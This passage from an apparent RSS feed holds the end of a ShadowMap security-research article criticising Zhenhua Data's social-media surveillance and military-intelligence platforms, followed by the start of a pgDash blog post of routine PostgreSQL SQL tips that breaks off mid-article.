<p>There are also several mentions of the underlying platforms being developed by “Beijing Juwei Hezhi Information Technology Co., Ltd.”, which has a very limited public presence but is listed online as “Juwei Hezhi is a company that analyzes social media big data”.</p>
<h3>Data Collection</h3>
<p>Zhenhua Data has a large number of platforms that are used for data collection. These include platforms monitoring your standard social media platforms such as Twitter, LinkedIn, Facebook, TikTok, VK, Instagram etc. They also monitor a wide range of media outlets, news websites, news aggregators such as Reddit, etc.</p>
<p>In-addition to this, they also seem to have private sources of data such as near real-time movement of warships, satellite tracking, troop movements, etc. More so we were able to find references to private feeds that have access to data from “affiliate apps &amp; websites”, but have not been able to discover or access these portals directly.</p>
<p>Some examples of the public data collection systems that are publicly accessible:</p>
<p><b>LinkedIn – </b>This particular system is configured to continuously search LinkedIn for a range of keywords and then downloads the matching profiles, photos, etc.</p>
<div id="attachment_2138"><p><a href="https://shadowmap.com/wp-content/uploads/2020/09/Downloading-LinkedIn-Profiles-By-Keywords.png"><img aria-describedby="caption-attachment-2138" loading="lazy" src="https://shadowmap.com/wp-content/uploads/2020/09/Downloading-LinkedIn-Profiles-By-Keywords-1024x551.png" alt="Downloading LinkedIn Profiles By Keywords" width="1024" height="551" srcset="https://shadowmap.com/wp-content/uploads/2020/09/Downloading-LinkedIn-Profiles-By-Keywords-980x527.png 980w, https://shadowmap.com/wp-content/uploads/2020/09/Downloading-LinkedIn-Profiles-By-Keywords-480x258.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1024px, 100vw"></a></p><p id="caption-attachment-2138">Downloading LinkedIn Profiles By Keywords</p></div><p><b>TikTok – </b>This particular system is configured to monitor specific target accounts and download all videos, comments, user relationships, etc in near real time. Another interesting note here, a lot of the accounts being monitored are related to US Army recruitment and active duty forces.</p>
<div id="attachment_2139"><p><a href="https://shadowmap.com/wp-content/uploads/2020/09/Monitoring-TikTok-Videos-Comments-for-Target-Accounts.png"><img onload="Wpfcll.r(this,true);" src="https://shadowmap.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" aria-describedby="caption-attachment-2139" loading="lazy" data-wpfc-original-src="https://shadowmap.com/wp-content/uploads/2020/09/Monitoring-TikTok-Videos-Comments-for-Target-Accounts-1024x550.png" alt="blank" width="1024" height="550" data-wpfc-original-srcset="https://shadowmap.com/wp-content/uploads/2020/09/Monitoring-TikTok-Videos-Comments-for-Target-Accounts-980x527.png 980w, https://shadowmap.com/wp-content/uploads/2020/09/Monitoring-TikTok-Videos-Comments-for-Target-Accounts-480x258.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1024px, 100vw"></a></p><p id="caption-attachment-2139">Monitoring TikTok Videos and Comments for Target Accounts</p></div><p><b>Reddit – </b>This particular system is configured to monitor specific subreddits such as /r/politics to continuously track news stories, upvotes, users, etc.</p>
<div id="attachment_2140"><p><a href="https://shadowmap.com/wp-content/uploads/2020/09/Reddit-News-Politics-Monitoring.png"><img onload="Wpfcll.r(this,true);" src="https://shadowmap.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" aria-describedby="caption-attachment-2140" loading="lazy" data-wpfc-original-src="https://shadowmap.com/wp-content/uploads/2020/09/Reddit-News-Politics-Monitoring-1024x549.png" alt="Reddit News Politics Monitoring" width="1024" height="549" data-wpfc-original-srcset="https://shadowmap.com/wp-content/uploads/2020/09/Reddit-News-Politics-Monitoring-980x525.png 980w, https://shadowmap.com/wp-content/uploads/2020/09/Reddit-News-Politics-Monitoring-480x257.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1024px, 100vw"></a></p><p id="caption-attachment-2140">Reddit News Politics Monitoring</p></div><p><b>Forum Discussions – </b>This particular system is configured to monitor a wide range of internet forum discussions, actively scraping all posts being made, data about users along with the sentiment of the post.</p>
<div id="attachment_2141"><p><a href="https://shadowmap.com/wp-content/uploads/2020/09/Forums-BBS-Monitoring.png"><img onload="Wpfcll.r(this,true);" src="https://shadowmap.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" aria-describedby="caption-attachment-2141" loading="lazy" data-wpfc-original-src="https://shadowmap.com/wp-content/uploads/2020/09/Forums-BBS-Monitoring-1024x525.png" alt="Forum &amp; BBS Monitoring" width="1024" height="525" data-wpfc-original-srcset="https://shadowmap.com/wp-content/uploads/2020/09/Forums-BBS-Monitoring-980x502.png 980w, https://shadowmap.com/wp-content/uploads/2020/09/Forums-BBS-Monitoring-480x246.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1024px, 100vw"></a></p><p id="caption-attachment-2141">Forum &amp; BBS Monitoring</p></div><p><b>Databases of Key Individuals &amp; Organisations – </b>This particular system maintains a real-time list of key Mobile Applications, Media Organisations, Think Tanks, Social Media accounts, etc.</p>
<div id="attachment_2170"><p><a href="https://shadowmap.com/wp-content/uploads/2020/09/Zenhua-Data-Databases.png"><img onload="Wpfcll.r(this,true);" src="https://shadowmap.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" aria-describedby="caption-attachment-2170" loading="lazy" data-wpfc-original-src="https://shadowmap.com/wp-content/uploads/2020/09/Zenhua-Data-Databases-1024x584.png" alt="Zenhua Data - Database of Key Targets" width="1024" height="584" data-wpfc-original-srcset="https://shadowmap.com/wp-content/uploads/2020/09/Zenhua-Data-Databases-980x559.png 980w, https://shadowmap.com/wp-content/uploads/2020/09/Zenhua-Data-Databases-480x274.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1024px, 100vw"></a></p><p id="caption-attachment-2170">Zenhua Data – Database of Key Targets</p></div><p><strong>Tracking Global Risk Events – </strong>This particular system is configured to track a number of global risk events such as Weapons of Mass Destruction, Extreme weather events, Climate change mitigation and response, Network Attack, etc.</p>
<div id="attachment_2156"><p><a href="https://shadowmap.com/wp-content/uploads/2020/09/Global-Risk-Event-Data-Center.png"><img onload="Wpfcll.r(this,true);" src="https://shadowmap.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" aria-describedby="caption-attachment-2156" loading="lazy" data-wpfc-original-src="https://shadowmap.com/wp-content/uploads/2020/09/Global-Risk-Event-Data-Center-1024x551.png" alt="Global Risk Event Data Center" width="1024" height="551" data-wpfc-original-srcset="https://shadowmap.com/wp-content/uploads/2020/09/Global-Risk-Event-Data-Center-980x528.png 980w, https://shadowmap.com/wp-content/uploads/2020/09/Global-Risk-Event-Data-Center-480x258.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1024px, 100vw"></a></p><p id="caption-attachment-2156">Global Risk Event Data Center</p></div><h3><strong>Data Correlation</strong></h3>
<p>While some of the Data Collection systems may seem like they would be part of the scope of any average social media big data company, the use-cases and correlations that we have been able to discover are where it really gets interesting.</p>
<p><strong>Internet Big Data Military Intelligence System</strong></p>
<p>One of the early systems that our platform discovered that is directly linked to Zhenhua Data. This platform certainly tells a different story from the “social media monitoring” cover that has been used. The platform seems to have 4 modules: <strong>Internet Information Collection System</strong>, <strong>Big Data Cleaning &amp; Processing System</strong>, <strong>Foreign Army Internet Intelligence System</strong> &amp; <strong>Key Group Monitoring and Analysis System</strong>.</p>
<div id="attachment_2137"><p><a href="https://shadowmap.com/wp-content/uploads/2020/09/Zhenhua-Data-Internet-Big-Data-Military-Intelligence-System.png"><img onload="Wpfcll.r(this,true);" src="https://shadowmap.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" aria-describedby="caption-attachment-2137" loading="lazy" data-wpfc-original-src="https://shadowmap.com/wp-content/uploads/2020/09/Zhenhua-Data-Internet-Big-Data-Military-Intelligence-System-1024x521.png" alt="Zhenhua Data Internet Big Data Military Intelligence System" width="1024" height="521" data-wpfc-original-srcset="https://shadowmap.com/wp-content/uploads/2020/09/Zhenhua-Data-Internet-Big-Data-Military-Intelligence-System-980x499.png 980w, https://shadowmap.com/wp-content/uploads/2020/09/Zhenhua-Data-Internet-Big-Data-Military-Intelligence-System-480x244.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1024px, 100vw"></a></p><p id="caption-attachment-2137">Zhenhua Data Internet Big Data Military Intelligence System</p></div><p>On digging further, we discovered another platform that leverages several of the private and public data collection systems to create actionable military intelligence.</p>
<p><strong>Real-time War Ship Monitoring &amp; Correlation Platform</strong></p>
<p>This platform allows for tracking near real-time movements of both commercial and military naval ships. In-addition, it can correlate a wide range of information such as Social Media information of the crew on-board each vessel, photos and videos from individuals and official social media accounts, news stories, weapons manifests, historical location data, etc.</p>
<p>The strike chain functionality tracks key personnel as well, which are in-turn related with the much talked about OKIDB (Overseas Key Information Database), which allows you to get more relevant and correlated data about each individual target.</p>
<div id="attachment_2149"><p><a href="https://shadowmap.com/wp-content/uploads/2020/09/zenhua-data-warship-monitoring.png"><img onload="Wpfcll.r(this,true);" src="https://shadowmap.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" aria-describedby="caption-attachment-2149" loading="lazy" data-wpfc-original-src="https://shadowmap.com/wp-content/uploads/2020/09/zenhua-data-warship-monitoring-1024x515.png" alt="Zenhua Data Warship Monitoring" width="1024" height="515" data-wpfc-original-srcset="https://shadowmap.com/wp-content/uploads/2020/09/zenhua-data-warship-monitoring-1024x515.png 1024w, https://shadowmap.com/wp-content/uploads/2020/09/zenhua-data-warship-monitoring-980x493.png 980w, https://shadowmap.com/wp-content/uploads/2020/09/zenhua-data-warship-monitoring-480x242.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1024px, 100vw"></a></p><p id="caption-attachment-2149">Zenhua Data Warship Monitoring</p></div>

<div id="attachment_2155"><p><a href="https://shadowmap.com/wp-content/uploads/2020/09/Strike-Chain-Key-Personnel.png"><img onload="Wpfcll.r(this,true);" src="https://shadowmap.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" aria-describedby="caption-attachment-2155" loading="lazy" data-wpfc-original-src="https://shadowmap.com/wp-content/uploads/2020/09/Strike-Chain-Key-Personnel-e1600311890142-1024x520.png" alt="Strike Chain - Tracking Key Personnel" width="1024" height="520" data-wpfc-original-srcset="https://shadowmap.com/wp-content/uploads/2020/09/Strike-Chain-Key-Personnel-e1600311890142-980x498.png 980w, https://shadowmap.com/wp-content/uploads/2020/09/Strike-Chain-Key-Personnel-e1600311890142-480x244.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1024px, 100vw"></a></p><p id="caption-attachment-2155">Strike Chain – Tracking Key Personnel</p></div><p><strong>Correlating Social Media Data with OKIDB</strong></p>
<p>Zenhua Data also has Social Media Relationship Query tools available to analyse target social media accounts, their relationships with other individuals and further allows you to access additional data stored about each individual in the OKIDB.</p>
<p>Each of the millions of members (a sample shown in the excel), have a “Character ID” and have a page in the OKIDB that contains more details about themselves, their social media accounts, their families, their businesses, their relationships, etc. The OKIDB contains data about politicians, royalty, business leaders, journalists, members of think tanks, research scientists, etc.</p>
<div id="attachment_2157"><p><a href="https://shadowmap.com/wp-content/uploads/2020/09/Zhenhua-Data-PMO-India-Social-Relationship-Query-Tool.png"><img onload="Wpfcll.r(this,true);" src="https://shadowmap.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" aria-describedby="caption-attachment-2157" loading="lazy" data-wpfc-original-src="https://shadowmap.com/wp-content/uploads/2020/09/Zhenhua-Data-PMO-India-Social-Relationship-Query-Tool-1024x199.png" alt="Zhenhua Data PMO India Social Media Relationship Query Tool" width="1024" height="199" data-wpfc-original-srcset="https://shadowmap.com/wp-content/uploads/2020/09/Zhenhua-Data-PMO-India-Social-Relationship-Query-Tool-980x190.png 980w, https://shadowmap.com/wp-content/uploads/2020/09/Zhenhua-Data-PMO-India-Social-Relationship-Query-Tool-480x93.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1024px, 100vw"></a></p><p id="caption-attachment-2157">Zhenhua Data PMO India Social Media Relationship Query Tool</p></div><div id="attachment_2158"><p><a href="https://shadowmap.com/wp-content/uploads/2020/09/Zenhua-Data-OKIDB-User-Data.png"><img onload="Wpfcll.r(this,true);" src="https://shadowmap.com/wp-content/plugins/wp-fastest-cache-premium/pro/images/blank.gif" aria-describedby="caption-attachment-2158" loading="lazy" data-wpfc-original-src="https://shadowmap.com/wp-content/uploads/2020/09/Zenhua-Data-OKIDB-User-Data-1024x514.png" alt="Zenhua Data OKIDB User Data" width="1024" height="514" data-wpfc-original-srcset="https://shadowmap.com/wp-content/uploads/2020/09/Zenhua-Data-OKIDB-User-Data-980x492.png 980w, https://shadowmap.com/wp-content/uploads/2020/09/Zenhua-Data-OKIDB-User-Data-480x241.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1024px, 100vw"></a></p><p id="caption-attachment-2158">Zenhua Data OKIDB User Data</p></div><p>In-addition to these systems, there are hundreds of other such systems online that are secured behind login pages or have been taken offline since the media attention started and as such have not been accessed by ShadowMap.</p>
<p><b>Some of the other systems which are online but not accessible since they are behind login pages:</b></p>

<h3><strong>Identified</strong> <strong>Targets</strong></h3>
<p>The OKIDB has been covered in-depth by <a href="https://indianexpress.com/article/express-exclusive/china-watching-indian-politicians-big-data-hybrid-cyber-warfare-shenzhen-information-technology-6594805/">several</a> <a href="https://www.washingtonpost.com/world/asia_pacific/chinese-firm-harvests-social-media-posts-data-of-prominent-americans-and-military/2020/09/14/b1f697ce-f311-11ea-8025-5d3489768ac8_story.html">media</a> <a href="https://www.theguardian.com/world/2020/sep/14/zhenhua-data-full-list-leak-database-personal-details-millions-china-tech-company">organisations</a> that have dissected the list of targets in detail. Generally speaking the OKIDB seems to contain information about anybody that has any level of influence or is affiliated with any such person. The influence is determined on the basis of social media relationships, news mentions, face recognition in public photographs, etc.</p>
<p>We also found several target keyword lists that are actively being used as part of the data collection platforms and seem to be focusing on a wide range of keywords related to Hong Kong. These include key events such as “2019 Prince Edward station attack”, famous protestors such as “Black super brother”, phrases such as “Trying to decrypt” and hundreds of political individuals on both sides.</p>

<h3><b>Conclusion to the Zhenhua Data Story</b></h3>
<p>After studying the ShadowMap reports for&nbsp;Zhenhua Data, we are reasonably certain that everything we have seen so far is only scratching the surface of the Data Collection and Internet Intelligence Systems in place.</p>
<p>While most folks brush off concerns around social media monitoring, as the “price of admission”, privacy and security professionals understand the true risks and have been raising warnings for years. From something as simple as when <a href="https://www.theguardian.com/world/2018/jan/28/fitness-tracking-app-gives-away-location-of-secret-us-army-bases">Fitbit tracking app Strava disclosed the location of secret US army bases</a>, to modernising and automating the process of gaining “kompromat” on a target.</p>
<p>The technology and capabilities we have seen with Zhenhua Data show us that the dystopian future that George Orwell’s 1984 warned us about, is here to stay. From silencing political opponents, quashing protests, spreading misinformation to influence elections or attacking enemy militaries – Big Data Surveillance systems will continue to have a significant role to play in geo-politics.</p></div></div></div></div>]]>
            </description>
            <link>https://shadowmap.com/security-research/investigating-chinese-intelligence-firm-zhenhua-data/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24504951</guid>
            <pubDate>Thu, 17 Sep 2020 14:21:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Postgres Tips and Tricks]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24504948">thread link</a>) | @i_have_to_speak
<br/>
September 17, 2020 | http://pgdash.io/blog/postgres-tips-and-tricks.html?hh | <a href="https://web.archive.org/web/*/http://pgdash.io/blog/postgres-tips-and-tricks.html?hh">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
          
          <p>SQL snippets to increase your Postgres productivity
</p>
        </div>
      </div><div>
        <div>
          <div>
            <p>Do you work with Postgres on a daily basis? Write application code that talks
to Postgres? Then check out the bite-sized SQL snippets below that can help
you work faster!</p>

<h3 id="insert-multiple-rows-in-one-statement">Insert Multiple Rows In One Statement</h3>

<p>The INSERT statement can insert more than one row in a single statement:</p>

<figure><pre><code data-lang="sql"><span>INSERT</span> <span>INTO</span> <span>planets</span> <span>(</span><span>name</span><span>,</span> <span>gravity</span><span>)</span>
     <span>VALUES</span> <span>(</span><span>'earth'</span><span>,</span>    <span>9</span><span>.</span><span>8</span><span>),</span>
            <span>(</span><span>'mars'</span><span>,</span>     <span>3</span><span>.</span><span>7</span><span>),</span>
            <span>(</span><span>'jupiter'</span><span>,</span> <span>23</span><span>.</span><span>1</span><span>);</span></code></pre></figure>

<p>Read more about what INSERT can do <a href="http://pgdash.io/blog/postgres-insert.html">here</a>.</p>

<h3 id="insert-a-row-and-return-automatically-assigned-values">Insert a Row and Return Automatically-assigned Values</h3>

<p>Values auto-generated with DEFAULT/serial/IDENTITY constructs can be returned
by the INSERT statement using the RETURNING clause. From the application
code perspective, such an INSERT is executed like a SELECT that returns a
recordset.</p>

<figure><pre><code data-lang="sql"><span>-- table with 2 column values auto-generated on INSERT</span>
<span>CREATE</span> <span>TABLE</span> <span>items</span> <span>(</span>
    <span>slno</span>       <span>serial</span>      <span>PRIMARY</span> <span>KEY</span><span>,</span>
    <span>name</span>       <span>text</span>        <span>NOT</span> <span>NULL</span><span>,</span>
    <span>created_at</span> <span>timestamptz</span> <span>DEFAULT</span> <span>now</span><span>()</span>
<span>);</span>

<span>INSERT</span> <span>INTO</span> <span>items</span> <span>(</span><span>name</span><span>)</span>
     <span>VALUES</span> <span>(</span><span>'wooden axe'</span><span>),</span>
            <span>(</span><span>'loom'</span><span>),</span>
            <span>(</span><span>'eye of ender'</span><span>)</span>
  <span>RETURNING</span> <span>name</span><span>,</span> <span>slno</span><span>,</span> <span>created_at</span><span>;</span>

<span>-- returns:</span>
<span>--      name     | slno |          created_at</span>
<span>-- --------------+------+-------------------------------</span>
<span>--  wooden axe   |    1 | 2020-08-17 05:35:45.962725+00</span>
<span>--  loom         |    2 | 2020-08-17 05:35:45.962725+00</span>
<span>--  eye of ender |    3 | 2020-08-17 05:35:45.962725+00</span></code></pre></figure>

<h3 id="autogenerated-uuid-primary-keys">Autogenerated UUID Primary Keys</h3>

<p>UUIDs are sometimes used instead of primary keys for various reasons. Here is
how you can use an UUID instead of a serial or IDENTITY:</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>EXTENSION</span> <span>IF</span> <span>NOT</span> <span>EXISTS</span> <span>"uuid-ossp"</span><span>;</span>

<span>CREATE</span> <span>TABLE</span> <span>items</span> <span>(</span>
    <span>id</span>    <span>uuid</span> <span>DEFAULT</span> <span>uuid_generate_v4</span><span>(),</span>
    <span>name</span>  <span>text</span> <span>NOT</span> <span>NULL</span>
<span>);</span>

<span>INSERT</span> <span>INTO</span> <span>items</span> <span>(</span><span>name</span><span>)</span>
     <span>VALUES</span> <span>(</span><span>'wooden axe'</span><span>),</span>
            <span>(</span><span>'loom'</span><span>),</span>
            <span>(</span><span>'eye of ender'</span><span>)</span>
  <span>RETURNING</span> <span>id</span><span>,</span> <span>name</span><span>;</span>
  
<span>-- returns:</span>
<span>--                   id                  |     name</span>
<span>-- --------------------------------------+--------------</span>
<span>--  1cfaae8c-61ff-4e82-a656-99263b7dd0ae | wooden axe</span>
<span>--  be043a89-a51b-4d8b-8378-699847113d46 | loom</span>
<span>--  927d52eb-c175-4a97-a0b2-7b7e81d9bc8e | eye of ender</span></code></pre></figure>

<h3 id="insert-if-not-existing-update-otherwise">Insert If Not Existing, Update Otherwise</h3>

<p>In Postgres 9.5 and later, you can <em>upsert</em> directly using the ON CONFLICT
construct:</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> <span>parameters</span> <span>(</span>
    <span>key</span>   <span>TEXT</span> <span>PRIMARY</span> <span>KEY</span><span>,</span>
    <span>value</span> <span>TEXT</span>
<span>);</span>

<span>-- when "key" causes a constraint violation, update the "value"</span>
<span>INSERT</span> <span>INTO</span> <span>parameters</span> <span>(</span><span>key</span><span>,</span> <span>value</span><span>)</span> 
     <span>VALUES</span> <span>(</span><span>'port'</span><span>,</span> <span>'5432'</span><span>)</span>
<span>ON</span> <span>CONFLICT</span> <span>(</span><span>key</span><span>)</span> <span>DO</span>
            <span>UPDATE</span> <span>SET</span> <span>value</span><span>=</span><span>EXCLUDED</span><span>.</span><span>value</span><span>;</span></code></pre></figure>

<h3 id="copy-rows-from-one-table-into-another">Copy Rows From One Table Into Another</h3>

<p>The INSERT statement has a form where the values can be supplied by a SELECT
statement. Use this to copy rows from one table into another:</p>

<figure><pre><code data-lang="sql"><span>-- copy between tables with similar columns </span>
  <span>INSERT</span> <span>INTO</span> <span>pending_quests</span>
<span>SELECT</span> <span>*</span> <span>FROM</span> <span>quests</span>
        <span>WHERE</span> <span>progress</span> <span>&lt;</span> <span>100</span><span>;</span>

<span>-- supply some values from another table, some directly</span>
  <span>INSERT</span> <span>INTO</span> <span>archived_quests</span>
       <span>SELECT</span> <span>now</span><span>()</span> <span>AS</span> <span>archival_date</span><span>,</span> <span>*</span>
         <span>FROM</span> <span>quests</span>
        <span>WHERE</span> <span>completed</span><span>;</span></code></pre></figure>

<p>If you’re looking to bulk-load tables, also check out the <a href="https://www.postgresql.org/docs/current/sql-copy.html">COPY command</a>,
which can be used to insert rows from a text or CSV file.</p>

<h3 id="delete-and-return-deleted-information">Delete and Return Deleted Information</h3>

<p>You can use the <code>RETURNING</code> clause to return values from the rows that were
deleted using a bulk-delete statement:</p>

<figure><pre><code data-lang="sql"><span>-- return the list of customers whose licenses were deleted after expiry</span>
<span>DELETE</span> <span>FROM</span> <span>licenses</span>
      <span>WHERE</span> <span>now</span><span>()</span> <span>&gt;</span> <span>expiry_date</span>
  <span>RETURNING</span> <span>customer_name</span><span>;</span></code></pre></figure>

<h3 id="move-rows-from-one-table-into-another">Move Rows From One Table Into Another</h3>

<p>You can move rows from one table to another in a single statement, by using CTEs
with <em>DELETE .. RETURNING</em>:</p>

<figure><pre><code data-lang="sql"><span>-- move yet-to-start todo items from 2020 to 2021</span>
<span>WITH</span> <span>ah_well</span> <span>AS</span> <span>(</span>
    <span>DELETE</span> <span>FROM</span> <span>todos_2020</span>
          <span>WHERE</span> <span>NOT</span> <span>started</span>
      <span>RETURNING</span> <span>*</span>
<span>)</span>
<span>INSERT</span> <span>INTO</span> <span>todos_2021</span>
            <span>SELECT</span> <span>*</span> <span>FROM</span> <span>ah_well</span><span>;</span></code></pre></figure>

<h3 id="update-rows-and-return-updated-values">Update Rows and Return Updated Values</h3>

<p>The RETURNING clause can be used in UPDATEs too. Note that only the new
values of the updated columns can be returned this way.</p>

<figure><pre><code data-lang="sql"><span>-- grant random amounts of coins to eligible players</span>
   <span>UPDATE</span> <span>players</span>
      <span>SET</span> <span>coins</span> <span>=</span> <span>coins</span> <span>+</span> <span>(</span><span>100</span> <span>*</span> <span>random</span><span>())::</span><span>integer</span>
    <span>WHERE</span> <span>eligible</span>
<span>RETURNING</span> <span>id</span><span>,</span> <span>coins</span><span>;</span></code></pre></figure>

<p>If you need the original value of the updated columns: it is possible through a
self-join, but there is no guarantee of atomicity. Try using a <code>SELECT .. FOR
UPDATE</code> instead.</p>

<h3 id="update-a-few-random-rows-and-return-the-updated-ones">Update a Few Random Rows and Return The Updated Ones</h3>

<p>Here’s how you can choose a few random rows from a table, update them and
return the updated ones, all in one go:</p>

<figure><pre><code data-lang="sql"><span>WITH</span> <span>lucky_few</span> <span>AS</span> <span>(</span>
    <span>SELECT</span> <span>id</span>
      <span>FROM</span> <span>players</span>
  <span>ORDER</span> <span>BY</span> <span>random</span><span>()</span>
     <span>LIMIT</span> <span>5</span>
<span>)</span>
   <span>UPDATE</span> <span>players</span>
      <span>SET</span> <span>bonus</span> <span>=</span> <span>bonus</span> <span>+</span> <span>100</span> 
    <span>WHERE</span> <span>id</span> <span>IN</span> <span>(</span><span>SELECT</span> <span>id</span> <span>FROM</span> <span>lucky_few</span><span>)</span>
<span>RETURNING</span> <span>id</span><span>;</span></code></pre></figure>

<h3 id="create-a-table-just-like-another-table">Create a Table Just Like Another Table</h3>

<p>Use the CREATE TABLE .. LIKE construct to create a table with the same columns
as another:</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> <span>to_be_audited</span> <span>(</span><span>LIKE</span> <span>purchases</span><span>);</span></code></pre></figure>

<p>By default this does not create similar indexes, constraints, defaults etc. To
do that, ask Postgres explicitly:</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> <span>to_be_audited</span> <span>(</span><span>LIKE</span> <span>purchases</span> <span>INCLUDING</span> <span>ALL</span><span>);</span></code></pre></figure>

<p>See the full syntax <a href="https://www.postgresql.org/docs/current/sql-createtable.html">here</a>.</p>

<h3 id="extract-a-random-set-of-rows-into-another-table">Extract a Random Set of Rows Into Another Table</h3>

<p>Since Postgres 9.5, the TABLESAMPLE feature is available to extract a sample of
rows from a table. There are two sampling methods currently, and <em>bernoulli</em> is
usually the one you want:</p>

<figure><pre><code data-lang="sql"><span>-- copy 10% of today's purchases into another table</span>
<span>INSERT</span> <span>INTO</span> <span>to_be_audited</span>
     <span>SELECT</span> <span>*</span>
       <span>FROM</span> <span>purchases</span>
<span>TABLESAMPLE</span> <span>bernoulli</span><span>(</span><span>10</span><span>)</span>
      <span>WHERE</span> <span>transaction_date</span> <span>=</span> <span>CURRENT_DATE</span><span>;</span></code></pre></figure>

<p>The <em>system</em> tablesampling method is faster, but does not return a uniform
distribution. See the <a href="https://www.postgresql.org/docs/current/sql-select.html#SQL-FROM">docs</a>
for more info.</p>

<h3 id="create-a-table-from-a-select-query">Create a Table From a Select Query</h3>

<p>You can use the CREATE TABLE .. AS construct to create the table and populate
it from a SELECT query, all in one go:</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> <span>to_be_audited</span> <span>AS</span>
      <span>SELECT</span> <span>*</span>
        <span>FROM</span> <span>purchases</span>
 <span>TABLESAMPLE</span> <span>bernoulli</span><span>(</span><span>10</span><span>)</span>
       <span>WHERE</span> <span>transaction_date</span> <span>=</span> <span>CURRENT_DATE</span><span>;</span></code></pre></figure>

<p>The resultant table is like a materialized view without a query associated with
it. Read more about <a href="https://www.postgresql.org/docs/current/sql-createtable.html">CREATE TABLE .. AS here</a>.</p>

<h3 id="create-unlogged-tables">Create Unlogged Tables</h3>

<p><em>Unlogged</em> tables are not backed by WAL records. This means that updates and
deletes to such tables are faster, but they are not crash-tolerant and cannot
be replicated.</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>UNLOGGED</span> <span>TABLE</span> <span>report_20200817</span> <span>(</span><span>LIKE</span> <span>report_v3</span><span>);</span></code></pre></figure>

<h3 id="create-temporary-tables">Create Temporary Tables</h3>

<p><em>Temporary</em> tables are implicitly unlogged tables, with a shorter lifetime. They
automatically self-destruct at the end of a session (default), or at the end
of the transaction.</p>

<p>Data within temporary tables cannot be shared across sessions. Multiple sessions
can create temporary tables with the same name.</p>

<figure><pre><code data-lang="sql"><span>-- temp table for duration of the session</span>
<span>CREATE</span> <span>TEMPORARY</span> <span>TABLE</span> <span>scratch_20200817_run_12</span> <span>(</span><span>LIKE</span> <span>report_v3</span><span>);</span>

<span>-- temp table that will self-destruct after current transaction</span>
<span>CREATE</span> <span>TEMPORARY</span> <span>TABLE</span> <span>scratch_20200817_run_12</span>
                      <span>(</span><span>LIKE</span> <span>report_v3</span><span>)</span>
                      <span>ON</span> <span>COMMIT</span> <span>DROP</span><span>;</span>

<span>-- temp table that will TRUNCATE itself after current transaction</span>
<span>CREATE</span> <span>TEMPORARY</span> <span>TABLE</span> <span>scratch_20200817_run_12</span>
                       <span>(</span><span>LIKE</span> <span>report_v3</span><span>)</span>
                       <span>ON</span> <span>COMMIT</span> <span>DELETE</span> <span>ROWS</span><span>;</span></code></pre></figure>



<p>Comments can be added to any object in the database. Many tools, including
pg_dump, understand these. A useful comment might just avoid a ton of trouble
during cleanup!</p>

<figure><pre><code data-lang="sql"><span>COMMENT</span> <span>ON</span> <span>INDEX</span> <span>idx_report_last_updated</span>
        <span>IS</span> <span>'needed for the nightly report app running in dc-03'</span><span>;</span>

<span>COMMENT</span> <span>ON</span> <span>TRIGGER</span> <span>tgr_fix_column_foo</span>
        <span>IS</span> <span>'mitigates the effect of bug #4857'</span><span>;</span></code></pre></figure>

<h3 id="advisory-locks">Advisory Locks</h3>

<p>Advisory locks can be used to co-ordinate actions between two apps connected to
the <em>same</em> database. You can use this feature to implement a global, distributed
mutex for a certain operation, for example. Read all about it <a href="https://www.postgresql.org/docs/current/explicit-locking.html#ADVISORY-LOCKS">here in the
docs</a>.</p>

<figure><pre><code data-lang="sql"><span>-- client 1: acquire a lock </span>
<span>SELECT</span> <span>pg_advisory_lock</span><span>(</span><span>130</span><span>);</span>
<span>-- ... do work ...</span>
<span>SELECT</span> <span>pg_advisory_unlock</span><span>(</span><span>130</span><span>);</span>

<span>-- client 2: tries to do the same thing, but mutually exclusive</span>
<span>-- with client 1</span>
<span>SELECT</span> <span>pg_advisory_lock</span><span>(</span><span>130</span><span>);</span> <span>-- blocks if anyone else has held lock with id 130</span>

<span>-- can also do it without blocking:</span>
<span>SELECT</span> <span>pg_try_advisory_lock</span><span>(</span><span>130</span><span>);</span>
